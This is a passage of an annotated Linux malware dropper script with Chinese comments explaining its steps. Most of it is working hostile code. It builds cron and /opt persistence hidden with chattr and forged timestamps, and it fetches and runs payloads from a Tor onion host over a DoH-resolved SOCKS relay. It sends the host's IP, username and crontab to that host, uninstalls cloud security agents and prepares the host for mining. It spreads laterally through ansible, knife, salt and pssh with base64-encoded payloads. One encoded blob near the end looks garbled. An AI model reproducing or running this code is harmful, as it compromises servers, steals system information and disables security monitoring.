-f $x #} #for h in tor2web.in tor2web.io tor2web.su onion.com.de tor2web.to onion.sh #do # 如果tmp/.X11-unix/01这个pid 在/proc/$pid/status不正常 #if ! ls /proc/$(head -1 /tmp/.X11-unix/01)/status; then # 执行u函数 #u $t.$h #else #break #fi #done # # 修改当前脚本的时间为/bin/grep touch -r /bin/grep $d/.systemd-service.sh # 给家目录下的.systemd-service.sh 添加x权限，并且添加不得任意更动文件或目录的i权限 chmod +x $d/.systemd-service.sh && chattr +i $d/.systemd-service.sh fi #如果opt不存在该脚本，写入/opt/systemd-service.sh if ! ls /opt/systemd-service.sh; then [ -s /opt/systemd-service.sh ] || echo -e \"#\\x21/bin/bash\\nexec &>/dev/null\\necho QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK\\necho UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash\" > /opt/systemd-service.sh # base64 解码函数 # QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK # exec &>/dev/null # export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin #d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) #c=$(echo \"curl -4fsSLkA- -m200\") #t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") #sockz() { #n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) #p=$(echo \"dns-query?name=relay.tor2socks.in\") #s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) #} #fexe() { #for i in /dev/shm /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done #} #u() { #sockz #fexe #f=/int.$(uname -m) #x=./$(date|md5sum|cut -f1 -d-) #r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) #$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r #chmod +x $x;$x;rm -f $x #} #for h in tor2web.in tor2web.io tor2web.su onion.com.de tor2web.to onion.sh #do #if ! ls /proc/$(head -1 /tmp/.X11-unix/01)/status; then #u $t.$h #else #break #fi #done # 创建文件，并使用/bin/grep下的时间混淆 touch -r /bin/grep /opt/systemd-service.sh # 添加x权限，并且添加不得任意更动文件或目录的i权限 chmod +x /opt/systemd-service.sh && chattr +i /opt/systemd-service.sh fi # 如果/etc/cron.d/0systemd-service定时任务不存在，则写入定时任务 if ! ls /etc/cron.d/0systemd-service; then [ -s /etc/cron.d/0systemd-service ] || echo \"$(echo $((RANDOM%59))) * * * * root /opt/systemd-service.sh > /dev/null 2>&1 &\" > /etc/cron.d/0systemd-service touch -r /bin/grep /etc/cron.d/0systemd-service fi # 如果用户的定时任务不存在，则写入crontab if ! crontab -l | grep ^[0-9] | grep systemd-service.sh; then (echo \"$(echo $((RANDOM%59))) * * * * $d/.systemd-service.sh > /dev/null 2>&1 &\";crontab -l|grep -v systemd-service.sh)|crontab - fi } x bash echo QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK # 屏蔽指定进程终端上的标准输出信息 exec &>/dev/null # 指定脚本执行的临时环境变量 export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin # id -u (uid) grep x:$uid: /etc/passwd => 取出当前用户 # cut -d: -f6 => -d: 以:为分界符，-f --fields 选中的列表，-f6 指 第6列，为用户的家目录 # $d = 当前用户的家目录 /home/aaron d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) # $c 是curl命令的字符串，用于拼接字符串 c=$(echo \"curl -4fsSLkA- -m200\") # $t 是字符串用于url拼接 t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") # sockz是dns解析函数 sockz() { n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \"dns-query?name=relay.tor2socks.in\") s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) } # 向目标目录写入exit，并添加x权限，并执行，最后删除 fexe() { for i in $d /tmp /var/tmp /dev/shm /usr/bin ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done } isys() { echo ZXhwb3J0IFBBVEg9JFBBVEg6JEhPTUU6L2Jpbjovc2JpbjovdXNyL2JpbjovdXNyL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9sb2NhbC9zYmluCmZ1bmN0aW9uIF9fY3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOn0KICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogICh3aGlsZSByZWFkIGxpbmU7IGRvCiAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lICYmIGNhdCkgPCYzCiAgZXhlYyAzPiYtCn0KCmN1cmwgLVYgfHwgYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCAteSBpbnN0YWxsIGN1cmwKY3VybCAtViB8fCB5dW0gLXkgaW5zdGFsbCBjdXJsCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMvZG93bmxvYWQvdjcuNzAuMC9jdXJsLWFtZDY0IC1PIC91c3IvbG9jYWwvYmluL2N1cmw7Y2htb2QgK3ggL3Vzci9sb2NhbC9iaW4vY3VybApjdXJsIC1WIHx8IHdnZXQgLXEgaHR0cHM6Ly9naXRodWIuY29tL21vcGFyaXN0aGViZXN0L3N0YXRpYy1jdXJsL3JlbGVhc2VzL2Rvd25sb2FkL3Y3LjcwLjAvY3VybC1hbWQ2NCAtTyAkSE9NRS9jdXJsO2NobW9kICt4ICRIT01FL2N1cmwKY3VybCAtViB8fCBfX2N1cmwgaHR0cDovLzEyMC4yNy4yNi4xODk6ODEvY3VybCA+IC91c3IvbG9jYWwvYmluL2N1cmw7Y2htb2QgK3ggL3Vzci9sb2NhbC9iaW4vY3VybApjdXJsIC1WIHx8IF9fY3VybCBodHRwOi8vMTIwLjI3LjI2LjE4OTo4MS9jdXJsID4gJEhPTUUvY3VybDtjaG1vZCAreCAkSE9NRS9jdXJsCg==base64 -d|bash # 指定临时环境变量 # export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin # function __curl() { # read proto server path /dev/tcp/${HOST}/$PORT # echo -en \"GET ${DOC} HTTP/1.0\\r\\nHost: ${HOST}\\r\\n\\r\\n\" >&3 # (while read line; do # [[ \"$line\" == $'\\r' ]] && break # done && cat) &- #} #curl -V || apt-get update && apt-get -y install curl #curl -V || yum -y install curl #curl -V || wget -q https://github.com/moparisthebest/static-curl/releases/download/v7.70.0/curl-amd64 -O /usr/local/bin/curl;chmod +x /usr/local/bin/curl #curl -V || wget -q https://github.com/moparisthebest/static-curl/releases/download/v7.70.0/curl-amd64 -O $HOME/curl;chmod +x $HOME/curl #curl -V || __curl http://120.27.26.189:81/curl > /usr/local/bin/curl;chmod +x /usr/local/bin/curl #curl -V || __curl http://120.27.26.189:81/curl > $HOME/curl;chmod +x $HOME/curl sysctl -w vm.nr_hugepages=1024 crontab -l || yum -y install cron crontab -l || yum -y install cronie crontab -l || apt-get update && apt-get -y install cron /etc/init.d/aegis uninstall /usr/local/qcloud/monitor/barad/admin/uninstall.sh /usr/local/qcloud/stargate/admin/uninstall.sh /usr/local/qcloud/YunJing/uninst.sh rm -rf /usr/loca/qcloud/ /usr/local/aegis/ systemctl start cron systemctl enable cron systemctl start crond systemctl enable crond } # 内网投毒 issh() { ansible all -m shell -a 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash' knife ssh 'name:*' 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash' salt '*' cmd.run 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash' pssh 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHVVVUVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash' hosts=$(grep -oE 